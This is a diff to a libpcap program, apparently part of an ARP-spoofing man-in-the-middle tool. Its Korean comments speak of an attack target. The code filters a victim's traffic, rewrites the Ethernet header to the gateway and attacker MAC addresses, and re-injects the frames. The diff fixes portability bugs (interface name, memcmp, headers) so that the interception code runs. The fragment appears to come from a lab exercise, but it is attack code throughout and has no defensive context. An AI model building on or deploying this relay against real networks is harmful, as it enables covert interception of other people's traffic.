@@ -1,6 +1,6 @@
-#include <stdio.h>
+#include <cstdio>
 #include <pcap.h>
-#include <string.h>
+#include <cstring>
 #include<stdlib.h>
 #include <net/ethernet.h>
 
@@ -11,7 +11,7 @@ const u_char GATEWAY_MAC[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; //gateway mac
 const u_char VICTIM_MAC[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; //38:f9:d3:71:e4:3f 
 
 
-const char TARGET_DEV_NAME[5] = "eth0";
+const char TARGET_DEV_NAME[5] = "en0";
 const char VICTIM_IP_FILTER[] = "host 172.20.10.3"; // private ip address
 pcap_t *handle;
 
@@ -128,12 +128,12 @@ void pkt_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *p
     printf("\n");
 
     int packet_size = header->caplen;
-    const u_char buf[packet_size + 1];
+    u_char buf[packet_size + 1];
     memcpy((void*)buf, packet, packet_size);
 
 
     // mac 주소로 타겟 확인
-    if(strncmp(VICTIM_MAC, buf + 6, 6)){
+    if(memcmp(VICTIM_MAC, buf + 6, 6)){
         printf("공격 대상의 mac 주소와 일치하지 않습니다. %x %x %x %x %x %x\n", *VICTIM_MAC, *(VICTIM_MAC + 1), *(VICTIM_MAC + 2), *(VICTIM_MAC + 3), *(VICTIM_MAC + 4), *(VICTIM_MAC + 5));
 		for(int i = 0 ; i < 6 ; i ++) {
 			printf("%c", *(buf+6+i));
@@ -146,7 +146,7 @@ void pkt_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *p
 
     // mac주소 변경
     memcpy((void*)buf, GATEWAY_MAC, 6);
-    memcpy((void*)buf + 6, HACKER_MAC, 6);
+    memcpy((void*)(buf + 6), HACKER_MAC, 6);
 
     //send packet
     int snd_result = pcap_inject(handle, buf, packet_size);
